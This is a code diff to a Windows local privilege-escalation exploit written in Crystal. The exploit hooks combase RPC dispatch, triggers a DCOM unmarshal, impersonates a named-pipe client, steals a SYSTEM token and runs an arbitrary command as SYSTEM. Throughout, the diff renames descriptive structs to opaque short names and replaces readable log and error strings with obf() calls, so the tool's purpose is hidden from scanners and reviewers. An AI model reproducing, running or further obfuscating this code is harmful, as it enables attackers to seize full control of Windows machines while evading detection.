@@ -184,7 +184,7 @@ struct ModuleInfoCR
   end
 end
 
-struct WinGUID
+struct Wg
   property data1 : UInt32 = 0_u32
   property data2 : UInt16 = 0_u16
   property data3 : UInt16 = 0_u16
@@ -194,7 +194,7 @@ struct WinGUID
   end
 end
 
-struct RpcVersion
+struct Rv
   property major : UInt16 = 0_u16
   property minor : UInt16 = 0_u16
 
@@ -202,18 +202,18 @@ struct RpcVersion
   end
 end
 
-struct RpcSyntaxIdentifier
-  property syntax_guid : WinGUID = WinGUID.new
-  property syntax_version : RpcVersion = RpcVersion.new
+struct Rs
+  property syntax_guid : Wg = Wg.new
+  property syntax_version : Rv = Rv.new
 
   def initialize
   end
 end
 
-struct RpcServerInterface
+struct Ri
   property length : UInt32 = 0_u32
-  property interface_id : RpcSyntaxIdentifier = RpcSyntaxIdentifier.new
-  property transfer_syntax : RpcSyntaxIdentifier = RpcSyntaxIdentifier.new
+  property interface_id : Rs = Rs.new
+  property transfer_syntax : Rs = Rs.new
   property dispatch_table : Pointer(Void) = Pointer(Void).null
   property rpc_protseq_endpoint_count : UInt32 = 0_u32
   property rpc_protseq_endpoint : Pointer(Void) = Pointer(Void).null
@@ -225,7 +225,7 @@ struct RpcServerInterface
   end
 end
 
-struct RpcDispatchTable
+struct Rd
   property dispatch_table_count : UInt32 = 0_u32
   property dispatch_table : Pointer(Void) = Pointer(Void).null
   property reserved : Int64 = 0_i64
@@ -234,7 +234,7 @@ struct RpcDispatchTable
   end
 end
 
-struct MidlServerInfo
+struct Mi
   property p_stub_desc : Pointer(Void) = Pointer(Void).null
   property dispatch_table : Pointer(Void) = Pointer(Void).null
   property proc_string : Pointer(Void) = Pointer(Void).null
@@ -284,7 +284,7 @@ struct ProcessInformationCR
 end
 
 @[Packed]
-struct SystemHandleTableEntryInfoEx
+struct He
   property object_pointer : UInt64 = 0_u64
   property process_id : UInt64 = 0_u64
   property handle_value : UInt64 = 0_u64
@@ -389,7 +389,7 @@ class ObjRef
   def self.parse(data : Bytes) : ObjRef
     io = IO::Memory.new(data)
     sig = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
-    raise "Invalid OBJREF signature: 0x#{sig.to_s(16)}" unless sig == OBJREF_SIGNATURE
+    raise obf("bad sig 0x") + sig.to_s(16) unless sig == OBJREF_SIGNATURE
     flags = io.read_bytes(UInt32, IO::ByteFormat::LittleEndian)
     guid = Bytes.new(16)
     io.read_fully(guid)
@@ -542,12 +542,12 @@ def detect_token_object_type : Int32
 
   num_handles = Pointer(UInt64).new(buf.address).value
   entry_offset = sizeof(UInt64) * 2
-  entry_size = sizeof(SystemHandleTableEntryInfoEx)
+  entry_size = sizeof(He)
 
   token_type = -1_i32
   num_handles.times do |i|
     addr = buf.address + entry_offset + i * entry_size
-    entry = Pointer(SystemHandleTableEntryInfoEx).new(addr).value
+    entry = Pointer(He).new(addr).value
     if entry.process_id == my_pid && entry.handle_value == my_token.address.to_u64
       token_type = entry.object_type.to_i32
       break
@@ -559,24 +559,24 @@ def detect_token_object_type : Int32
 end
 
 def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
-  log.try &.<< "[*] Start Search System Token"
+  log.try &.<< obf("[*] searching")
 
   token_type = detect_token_object_type
   if token_type < 0
-    log.try &.<< "[-] Could not find System Token"
+    log.try &.<< obf("[-] not found")
     return nil
   end
 
   result = query_system_handles
   unless result
-    log.try &.<< "[-] Could not find System Token"
+    log.try &.<< obf("[-] not found")
     return nil
   end
   buf, _ = result
 
   num_handles = Pointer(UInt64).new(buf.address).value
   entry_offset = sizeof(UInt64) * 2
-  entry_size = sizeof(SystemHandleTableEntryInfoEx)
+  entry_size = sizeof(He)
   local_proc = LibC.GetCurrentProcess
 
   last_pid = 0_u64
@@ -586,7 +586,7 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
 
   num_handles.times do |i|
     addr = buf.address + entry_offset + i * entry_size
-    entry = Pointer(SystemHandleTableEntryInfoEx).new(addr).value
+    entry = Pointer(He).new(addr).value
 
     next if entry.object_type.to_i32 != token_type
     next if entry.granted_access == 0x0012019f_u32
@@ -627,7 +627,7 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
           dup_token, TOKEN_ELEVATION, Pointer(Void).null,
           SECURITY_IMPERSONATION, TOKEN_IMPERSONATION_TYPE,
           pointerof(new_token)) != 0
-        log.try &.<< "[*] PID : #{h_pid} Token:0x#{entry.handle_value.to_s(16)}  User: SYSTEM ImpersonationLevel: Impersonation"
+        log.try { |l| l << obf("[*] P:") + h_pid.to_s + obf(" H:0x") + entry.handle_value.to_s(16) + obf(" OK") }
         LibC.CloseHandle(dup_token)
         found_token = new_token
         break
@@ -640,7 +640,7 @@ def find_system_token(log : Array(String)? = nil) : Pointer(Void)?
   LibC.CloseHandle(proc_handle) unless proc_handle.null?
 
   unless found_token
-    log.try &.<< "[-] Could not find System Token"
+    log.try &.<< obf("[-] not found")
   end
   found_token
 end
@@ -654,7 +654,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   stdout_write = Pointer(Void).null
   if LibC.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
       pointerof(sa).as(Pointer(Void)), 8196_u32) == 0
-    dbg "[!] CreatePipe failed: #{LibC.GetLastError}"
+    dbg obf("[!] pipe err:") + LibC.GetLastError.to_s
     return
   end
 
@@ -693,7 +693,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
   LibC.CloseHandle(primary_token) if has_primary
 
   if created
-    dbg "[*] process start with pid #{pi.dw_process_id}"
+    dbg obf("[*] pid ") + pi.dw_process_id.to_s
     LibC.CloseHandle(stdout_write)
     stdout_write = Pointer(Void).null
 
@@ -717,7 +717,7 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
     LibC.CloseHandle(pi.h_process)
     LibC.CloseHandle(pi.h_thread)
   else
-    dbg "[!] CreateProcess failed. Error: #{LibC.GetLastError}"
+    dbg obf("[!] exec err:") + LibC.GetLastError.to_s
   end
 
   LibC.CloseHandle(stdout_write) unless stdout_write.null?
@@ -779,7 +779,7 @@ module HookState
       }).pointer
     {% end %}
     else
-      raise "Unsupported param count: #{param_count}"
+      raise obf("unsupported")
     end
     {% end %}
   end
@@ -837,9 +837,9 @@ class MyContext
 
     init_context
 
-    raise "No combase module found" if @combase_module == 0
-    raise "Cannot find IDL structure" if @dispatch_table.empty? || @proc_string == 0 || @use_protseq_function_ptr == 0
-    raise "UseProtseqFunctionParamCount == #{@use_protseq_param_count}" unless (4..14).includes?(@use_protseq_param_count)
+    raise obf("init failed") if @combase_module == 0
+    raise obf("init failed") if @dispatch_table.empty? || @proc_string == 0 || @use_protseq_function_ptr == 0
+    raise obf("init failed") unless (4..14).includes?(@use_protseq_param_count)
   end
 
   private def init_context
@@ -858,7 +858,7 @@ class MyContext
     dll_content = Bytes.new(module_size)
     dll_content.to_unsafe.copy_from(h_combase.as(Pointer(UInt8)), module_size)
 
-    rsi_size = sizeof(RpcServerInterface).to_u32
+    rsi_size = sizeof(Ri).to_u32
     pattern_io = IO::Memory.new
     pattern_io.write_bytes(rsi_size, IO::ByteFormat::LittleEndian)
     pattern_io.write(ORCB_GUID_BYTES)
@@ -868,10 +868,10 @@ class MyContext
     return if offsets.empty?
 
     rsi_addr = @combase_module + offsets[0].to_u64
-    rsi = Pointer(RpcServerInterface).new(rsi_addr).value
+    rsi = Pointer(Ri).new(rsi_addr).value
 
-    rpc_dt = Pointer(RpcDispatchTable).new(rsi.dispatch_table.address).value
-    midl_info = Pointer(MidlServerInfo).new(rsi.interpreter_info.address).value
+    rpc_dt = Pointer(Rd).new(rsi.dispatch_table.address).value
+    midl_info = Pointer(Mi).new(rsi.interpreter_info.address).value
 
     @dispatch_table_ptr = midl_info.dispatch_table.address
     @proc_string = midl_info.proc_string.address
@@ -908,7 +908,7 @@ class MyContext
     Pointer(Pointer(Void)).new(@dispatch_table_ptr).value = hook_ptr
 
     @is_hooked = true
-    dbg "[*] HookRPC"
+    dbg obf("[*] hooked")
   end
 
   private def log(msg : String)
@@ -933,10 +933,10 @@ class MyContext
       521_u32, 0_u32, 123_u32,
       pointerof(sa).as(Pointer(Void)))
 
-    log "[*] CreateNamedPipe #{@server_pipe}"
+    log obf("[*] listening ") + @server_pipe
 
     if pipe_handle == INVALID_HANDLE_VALUE
-      log "[!] CreateNamedPipe failed error:#{LibC.GetLastError}"
+      log obf("[!] listen err:") + LibC.GetLastError.to_s
       return
     end
 
@@ -944,7 +944,7 @@ class MyContext
     last_err = LibC.GetLastError
 
     if (is_connect != 0 || last_err == ERROR_PIPE_CONNECTED) && @is_started
-      log "[*] Pipe Connected!"
+      log obf("[*] connected")
 
       if LibC.ImpersonateNamedPipeClient(pipe_handle) != 0
         imp_token = Pointer(Void).null
@@ -954,35 +954,34 @@ class MyContext
           1, pointerof(imp_token))
         imp_token = Pointer(Void).null if ok == 0
 
-        current_sid = imp_token.null? ? "Unknown" : (get_token_sid(imp_token) || "Unknown")
+        current_sid = imp_token.null? ? "?" : (get_token_sid(imp_token) || "?")
         imp_level = imp_token.null? ? -1 : get_impersonation_level(imp_token)
 
-        log "[*] CurrentUser: #{current_sid}"
-        log "[*] CurrentsImpersonationLevel: #{imp_level}"
+        log obf("[*] sid:") + current_sid + obf(" il:") + imp_level.to_s
 
         LibC.CloseHandle(imp_token) unless imp_token.null?
 
         system_token = find_system_token(@log)
         if system_token
           @system_token = system_token
-          log "[*] Find System Token : True"
+          log obf("[*] found")
         else
-          log "[*] Find System Token : False"
+          log obf("[*] not found")
         end
 
         LibC.RevertToSelf
       else
-        log "[!] ImpersonateNamedPipeClient fail error:#{LibC.GetLastError}"
+        log obf("[!] err:") + LibC.GetLastError.to_s
       end
     else
-      log "[!] ConnectNamedPipe failed is_connect=#{is_connect} err=#{last_err}"
+      log obf("[!] conn err:") + is_connect.to_s + " " + last_err.to_s
     end
 
     LibC.CloseHandle(pipe_handle)
   end
 
   def start
-    raise "Must hook RPC first" unless @is_hooked
+    raise obf("not ready") unless @is_hooked
     return if @is_started
 
     @is_started = true
@@ -993,7 +992,7 @@ class MyContext
       PIPE_SERVER_THREAD_PROC,
       Pointer(Void).null,
       0_u32, pointerof(tid))
-    dbg "[*] Start PipeServer"
+    dbg obf("[*] started")
   end
 
   def join_pipe_thread
@@ -1048,20 +1047,20 @@ end
 def get_local_objref : ObjRef
   fake_obj = Pointer(Void).null
   hr = Ole32.CreateStreamOnHGlobal(Pointer(Void).null, 1, pointerof(fake_obj))
-  raise "CreateStreamOnHGlobal (fake) failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0
+  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
   hglobal = LibC.GlobalAlloc(0x0042_u32, 4096_u64)
-  raise "GlobalAlloc failed" if hglobal.null?
+  raise obf("alloc err") if hglobal.null?
 
   out_stream = Pointer(Void).null
   hr = Ole32.CreateStreamOnHGlobal(hglobal, 0, pointerof(out_stream))
-  raise "CreateStreamOnHGlobal (out) failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0
+  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
   iid = IID_IUNKNOWN.dup
   hr = Ole32.CoMarshalInterface(
     out_stream, iid.to_unsafe.as(Pointer(Void)), fake_obj,
     2_u32, Pointer(Void).null, 0_u32)
-  raise "CoMarshalInterface failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0
+  raise obf("marshal err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
   ptr = LibC.GlobalLock(hglobal)
   data = Bytes.new(4096)
@@ -1076,10 +1075,10 @@ def trigger_dcom(ctx : MyContext)
 
   guid_hex = tmp_objref.guid.hexstring
   ipid_hex = tmp_objref.standard_objref.ipid.hexstring
-  dbg "[*] DCOM obj GUID: #{guid_hex[0, 8]}-#{guid_hex[8, 4]}-#{guid_hex[12, 4]}-#{guid_hex[16, 4]}-#{guid_hex[20, 12]}"
-  dbg "[*] DCOM obj IPID: #{ipid_hex[0, 8]}-#{ipid_hex[8, 4]}-#{ipid_hex[12, 4]}-#{ipid_hex[16, 4]}-#{ipid_hex[20, 12]}"
-  dbg "[*] DCOM obj OXID: 0x#{tmp_objref.standard_objref.oxid.to_s(16)}"
-  dbg "[*] DCOM obj OID: 0x#{tmp_objref.standard_objref.oid.to_s(16)}"
+  dbg obf("[*] G:") + guid_hex
+  dbg obf("[*] I:") + ipid_hex
+  dbg obf("[*] OX:0x") + tmp_objref.standard_objref.oxid.to_s(16)
+  dbg obf("[*] OI:0x") + tmp_objref.standard_objref.oid.to_s(16)
 
   crafted_dsa = DualStringArray.new(
     StringBinding.new(EPM_PROTOCOL_TCP, obf("127.0.0.1")),
@@ -1094,24 +1093,23 @@ def trigger_dcom(ctx : MyContext)
       tmp_objref.standard_objref.ipid.dup))
 
   data = crafted_objref.get_bytes(crafted_dsa)
-  dbg "[*] Marshal Object bytes len: #{data.size}"
+  dbg obf("[*] len:") + data.size.to_s
 
   hglobal = LibC.GlobalAlloc(0x0002_u32, data.size.to_u64)
-  raise "GlobalAlloc failed for unmarshal" if hglobal.null?
+  raise obf("alloc err") if hglobal.null?
   ptr = LibC.GlobalLock(hglobal)
   ptr.as(Pointer(UInt8)).copy_from(data.to_unsafe, data.size)
   LibC.GlobalUnlock(hglobal)
 
   stream = Pointer(Void).null
   hr = Ole32.CreateStreamOnHGlobal(hglobal, 1, pointerof(stream))
-  raise "CreateStreamOnHGlobal for unmarshal failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}" if hr < 0
+  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0
 
   ppv = Pointer(Void).null
   iid = IID_IUNKNOWN.dup
-  dbg "[*] UnMarshal Object"
-  dbg "[*] Trigger RPCSS"
+  dbg obf("[*] triggering")
   hr = Ole32.CoUnmarshalInterface(stream, iid.to_unsafe.as(Pointer(Void)), pointerof(ppv))
-  dbg "[*] UnmarshalObject: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
+  dbg obf("[*] result:0x") + hr.unsafe_as(UInt32).to_s(16)
 end
 
 
@@ -1129,23 +1127,23 @@ def main
   end
 
   if command.empty?
-    STDERR.puts "[!] -c/--cmd is required"
+    STDERR.puts obf("[!] -c required")
     exit(1)
   end
 
   hr = Ole32.CoInitializeEx(Pointer(Void).null, 0_u32)
   if hr < 0
-    dbg "[!] CoInitializeEx failed: 0x#{hr.unsafe_as(UInt32).to_s(16)}"
+    dbg obf("[!] init err:0x") + hr.unsafe_as(UInt32).to_s(16)
     return
   end
 
   begin
     ctx = MyContext.new(pipe_name)
 
-    dbg "[*] CombaseModule: 0x#{ctx.combase_module.to_s(16)}"
-    dbg "[*] DispatchTable: 0x#{ctx.dispatch_table_ptr.to_s(16)}"
-    dbg "[*] UseProtseqFunction: 0x#{ctx.use_protseq_function_ptr.to_s(16)}"
-    dbg "[*] UseProtseqFunctionParamCount: #{ctx.use_protseq_param_count}"
+    dbg obf("[*] base:0x") + ctx.combase_module.to_s(16)
+    dbg obf("[*] dt:0x") + ctx.dispatch_table_ptr.to_s(16)
+    dbg obf("[*] fn:0x") + ctx.use_protseq_function_ptr.to_s(16)
+    dbg obf("[*] pc:") + ctx.use_protseq_param_count.to_s
 
     ctx.hook_rpc
     ctx.start
@@ -1155,23 +1153,23 @@ def main
     begin
       trigger_dcom(ctx)
     rescue ex
-      dbg "[!] Trigger error: #{ex.message}" unless ex.message == "Arithmetic overflow"
+      dbg obf("[!] ") + (ex.message || "?") unless ex.message == "Arithmetic overflow"
     end
 
     ctx.join_pipe_thread
 
     system_token = ctx.get_token
     if system_token
-      dbg "[*] CurrentUser: NT AUTHORITY\\SYSTEM"
+      dbg obf("[*] OK")
       create_process_read_output(system_token, command)
     else
-      dbg "[!] Failed to impersonate security context token"
+      dbg obf("[!] failed")
     end
 
     ctx.restore
     ctx.stop
   rescue ex
-    dbg "[!] #{ex.message}"
+    dbg obf("[!] ") + (ex.message || "?")
   end
 
   Ole32.CoUninitialize
